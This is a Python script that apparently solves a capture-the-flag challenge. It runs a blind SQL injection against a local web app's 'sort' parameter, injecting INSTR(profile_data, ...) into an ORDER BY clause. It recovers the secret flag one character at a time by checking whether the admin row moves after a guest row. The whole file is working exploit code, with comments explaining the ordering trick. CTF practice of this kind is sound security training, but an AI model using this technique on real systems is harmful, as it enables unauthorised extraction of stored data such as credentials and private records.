import requests
import string

BASE_URL = "http://127.0.0.1:5002"
alphabet = string.ascii_letters + string.digits + "{}_!"

extracted_flag = "DAKSHH{"
print(f"Starting extraction. Known prefix: {extracted_flag}")

while True:
    found_char = False
    for char in alphabet:
        test_str = extracted_flag + char
        # The injection: sort by INSTR. If the test_str is in profile_data, INSTR returns > 0.
        # It's an ORDER BY. If INSTR is > 0 (meaning true, it contains the string), we want admin to appear last (or first)
        # However, INSTR gives 0 if false, and >0 if true.
        # An order of ASC will put 0 first, and >0 later.
        # Since 'admin' has id=1, if sort=id (original), admin is first.
        # If we do ?sort=INSTR(profile_data, 'DAKSHH{w'), then:
        # For admin, it evaluates to 1 (if true). For others, it evaluates to 0.
        # So in ASC order, admin will be LAST!
        # If it's false, admin evaluates to 0, same as others. The original insertion order might prevail, so admin is first.
        
        payload = f"INSTR(profile_data, '{test_str}')"
        r = requests.get(f"{BASE_URL}/", params={"sort": payload})
        
        idx_admin = r.text.find("<td>admin</td>")
        idx_guest1 = r.text.find("<td>guest1</td>")
        if char == 'w':
            print(f"DEBUG for 'w': admin index={idx_admin}, guest1 index={idx_guest1}")
        
        if idx_admin > idx_guest1:
            # admin came after guest1, meaning INSTR was > 0
            extracted_flag += char
            found_char = True
            print(f"Found character: {char} -> Current: {extracted_flag}")
            break

    if not found_char or extracted_flag.endswith("}"):
        break

print(f"\nFinal Extracted Flag: {extracted_flag}")
